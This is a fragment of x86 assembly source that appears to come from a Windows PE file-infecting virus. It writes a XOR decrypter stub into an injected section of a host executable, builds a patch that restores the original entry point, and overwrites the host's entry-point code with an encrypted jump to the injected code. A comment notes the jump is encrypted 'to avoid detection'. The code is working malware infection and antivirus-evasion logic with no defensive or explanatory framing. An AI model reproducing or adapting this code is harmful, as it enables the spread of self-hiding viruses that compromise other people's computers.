; CREATING DECRYPTER
mov	edi, [DELTA PeFileMap]
add	edi, [DELTA PointerToRawData]
mov	eax, 0BFh ; Mov edi
stosb
mov	eax, DECRYPTER_SIZE + PATCHER_SIZE ; Address of our section to decrypt
add	eax, [DELTA BaseImage]
add	eax, [DELTA VirtualAddress]
stosd
mov	eax, 0F78Bh ; mov esi, edi
stosw
mov	eax, 0C933h ; xor ecx, ecx
stosw
mov	eax, 0ACh ; lodsb opcode
stosb
mov	eax, 035h ; xor opcode
stosb
mov	eax, [DELTA XorCrypt] ; random xor
stosd
mov	eax, 0AAh ; stosb
stosb
mov	eax, 041h ; inc ecx
stosb
mov	eax, 0F981h ; cmp ecx
stosw
mov	eax, endInject - toInject - DECRYPTER_SIZE - PATCHER_SIZE
stosd
mov	eax, 075h ; Je
stosb
mov	eax, -DECRYPTER_SIZE + 9
stosb

; CREATE REVERT PATCH ON OLD ENTRY POINT
mov	ecx, PATCH_SIZE
mov	edi, [DELTA PeFileMap] ; Destination bytes
add	edi, [DELTA PointerToRawData]
add	edi, DECRYPTER_SIZE ; After decrypter add our patch
mov	esi, [DELTA PeFileMap]
add	esi, [DELTA CodeSecRawData]
add	esi, [DELTA OffsetCodeSecEP]
mov	eax, 0BFh ; Mov edi, imm32
stosb
mov	eax, [DELTA OldEntryPoint]
add	eax, [DELTA BaseImage]
stosd
patchNewDword:
mov	eax, 0B8h ; mov eax, imm32
stosb
lodsd
stosd
mov	eax, 0ABh ; stosd
stosb
sub	ecx, 4
cmp	ecx, 0
jg	patchNewDword

; CREATING JUMP TO OLD ENTRY POINT
mov	edi, threadProgram - toInject ; Offset jmp
add	edi, [DELTA PeFileMap] ; Add base filemap
add	edi, [DELTA PointerToRawData] ; Add section offset
mov	eax, 0E9h ; JMP rel32 OPCODE
xor	eax, [DELTA XorCrypt] ; Encrypt
stosb
mov	eax, [DELTA OldEntryPoint] ; Entry point address
sub	eax, [DELTA VirtualAddress]
mov	esi, threadProgram - toInject
sub	eax, esi
sub	eax, 05h ; Add 5 bytes for JMP
xor	eax, [DELTA XorCrypt] ; encrypt
stosd


; PATCH SETTING JUMP ON FIRST SECTION POINTING TO US
; Decrypt jmp
; Setting where we place our patch (section + offset EP if needed)
mov	edi, [DELTA PeFileMap]
add	edi, [DELTA CodeSecRawData] ; filemap + pointer to raw data of code section
add	edi, [DELTA OffsetCodeSecEP] ; offset of EP
; Decrypt jmp to avoid detection
mov	eax, 0B9h ; Mov ecx imm32
stosb
mov	eax, 05h ; size of jump
stosd
mov	eax, 0BFh ; Mov edi imm32
stosb
; Get JMP Addr
mov	ebx, [DELTA BaseImage]
add	ebx, [DELTA OldEntryPoint]
add	ebx, PATCH_DECRYPT_SIZE
mov	eax, ebx
stosd
mov	eax, 0BEh ; Mov esi imm32
stosb
mov	eax, ebx
stosd
; Create loop now
mov	eax, 0ACh ; lodsb
stosb
mov	eax, 0F083h ; xor eax imm8
stosw
mov	eax, XorCrypt
stosb
mov	eax, 0AAh ; stosb
stosb
mov	eax, 0E2h ; loop rel8
stosb
mov	eax, 0FFh - 06h
stosb
; JUMP!JUMP!JUMP!
mov	eax, 0E9h ; JMP rel32 OPCODE
xor	eax, XorCrypt
stosb
mov	eax, [DELTA VirtualAddress]
sub	eax, [DELTA CodeSecVA]
sub	eax, [DELTA OffsetCodeSecEP] ; addr rel = Our VA - their VA - offset EP
sub	eax, 05h ; Remove 5 bytes for JMP
sub	eax, PATCH_DECRYPT_SIZE ; Remove our decrypter size
xor	eax, XorCrypt
stosd


